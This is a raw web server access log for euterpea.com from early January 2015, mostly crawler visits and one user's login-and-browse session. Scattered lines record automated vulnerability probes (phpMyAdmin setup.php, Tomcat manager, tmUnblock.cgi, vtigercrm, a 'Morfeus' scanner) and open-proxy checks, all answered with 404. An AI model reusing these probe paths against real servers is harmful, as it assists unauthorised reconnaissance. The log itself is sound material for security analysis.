66.249.75.169 - - [04/Jan/2015:05:42:55 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
115.159.68.74 - - [04/Jan/2015:06:36:55 -0500] "GET http://www.ly.com/ HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
66.249.75.185 - - [04/Jan/2015:06:43:34 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.13.50.71 - - [04/Jan/2015:07:47:13 -0500] "GET /user/soapCaller.bs HTTP/1.1" 404 - - "Morfeus Fucking Scanner"
66.249.75.201 - - [04/Jan/2015:08:39:58 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.185 - - [04/Jan/2015:09:40:17 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
107.23.45.196 - - [04/Jan/2015:10:06:07 -0500] "GET / HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.23.45.196 - - [04/Jan/2015:10:06:07 -0500] "GET /favicon.ico HTTP/1.1" 200 5108 "http://euterpea.com/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
157.55.39.79 - - [04/Jan/2015:10:41:53 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.79 - - [04/Jan/2015:10:42:08 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.225 - - [04/Jan/2015:11:38:34 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.217 - - [04/Jan/2015:11:38:34 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.217 - - [04/Jan/2015:12:37:43 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.35.68 - - [04/Jan/2015:13:07:55 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
125.64.35.68 - - [04/Jan/2015:15:38:14 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
182.118.55.163 - - [04/Jan/2015:16:42:05 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
107.191.51.141 - - [04/Jan/2015:20:08:28 -0500] "GET / HTTP/1.0" 200 - "EUTERPEA.COM" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
125.64.35.67 - - [04/Jan/2015:21:31:03 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
93.158.200.40 - - [05/Jan/2015:00:29:16 -0500] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 - - "-"
93.158.200.40 - - [05/Jan/2015:00:29:20 -0500] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 - - "-"
125.64.35.67 - - [05/Jan/2015:00:42:57 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
95.163.121.131 - - [05/Jan/2015:02:09:42 -0500] "GET /vtigercrm/test/upload/vtigercrm.txt HTTP/1.1" 404 - - "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.16.2.3 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
66.249.73.225 - - [05/Jan/2015:03:21:51 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.217 - - [05/Jan/2015:03:21:51 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.209 - - [05/Jan/2015:04:53:57 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.61.39.15 - - [05/Jan/2015:06:37:33 -0500] "GET / HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
66.249.67.137 - - [05/Jan/2015:08:16:03 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [05/Jan/2015:08:16:03 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.79 - - [05/Jan/2015:09:25:07 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
104.202.9.67 - - [05/Jan/2015:10:41:11 -0500] "GET /actionnews/index/ HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
66.249.67.129 - - [05/Jan/2015:11:18:08 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.129 - - [05/Jan/2015:12:45:23 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
73.180.144.9 - - [05/Jan/2015:14:19:07 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:07 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:07 -0500] "GET /starter-template.css HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:07 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:07 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:07 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:09 -0500] "POST /login HTTP/1.1" 302 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:10 -0500] "GET /stocks HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:10 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:19:10 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:20:47 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:20:48 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:20:48 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:00 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:00 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:00 -0500] "GET /starter-template.css HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:00 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:00 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:00 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:02 -0500] "GET /logout HTTP/1.1" 302 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:02 -0500] "GET / HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:02 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:02 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:04 -0500] "POST /login HTTP/1.1" 302 0 "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:04 -0500] "GET /stocks HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:04 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:21:04 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:22:06 -0500] "GET /stocks HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:22:06 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:22:06 -0500] "GET /starter-template.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:22:06 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:22:06 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:22:06 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:23:35 -0500] "GET /stocks HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:23:35 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:23:35 -0500] "GET /starter-template.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:23:35 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:23:35 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:23:35 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:31 -0500] "GET /stocks HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:32 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:32 -0500] "GET /starter-template.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:32 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:32 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:32 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:37 -0500] "GET /stocks HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:37 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:37 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:37 -0500] "GET /starter-template.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:37 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:14:27:37 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
66.249.67.129 - - [05/Jan/2015:15:41:38 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
73.180.144.9 - - [05/Jan/2015:15:41:39 -0500] "GET /stocks HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:39 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:39 -0500] "GET /starter-template.css HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:39 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:39 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 304 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:39 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:40 -0500] "POST /login HTTP/1.1" 302 0 "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:41 -0500] "GET /stocks HTTP/1.1" 200 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:41 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
73.180.144.9 - - [05/Jan/2015:15:41:41 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/stocks" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
66.249.67.129 - - [05/Jan/2015:18:39:27 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
115.159.67.85 - - [05/Jan/2015:20:48:50 -0500] "GET http://www.ly.com/ HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
66.249.67.129 - - [05/Jan/2015:23:00:26 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.137 - - [05/Jan/2015:23:00:26 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
182.254.156.77 - - [06/Jan/2015:03:18:07 -0500] "GET http://www.ly.com/ HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
125.64.35.68 - - [06/Jan/2015:06:18:00 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
201.91.5.170 - - [06/Jan/2015:08:14:08 -0500] "GET /manager/html HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
125.64.35.68 - - [06/Jan/2015:08:44:35 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
115.159.68.25 - - [06/Jan/2015:09:18:03 -0500] "GET http://www.ly.com/ HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
157.55.39.79 - - [06/Jan/2015:10:45:40 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
67.23.153.9 - - [06/Jan/2015:11:27:43 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
182.118.53.22 - - [06/Jan/2015:17:22:03 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
194.63.140.62 - - [07/Jan/2015:06:03:05 -0500] "GET / HTTP/1.1" 200 - - "Python-urllib/2.7"
66.249.67.28 - - [07/Jan/2015:10:29:22 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.36 - - [07/Jan/2015:10:29:22 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.20 - - [07/Jan/2015:10:38:17 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.36 - - [07/Jan/2015:10:38:18 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.28 - - [07/Jan/2015:10:38:19 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
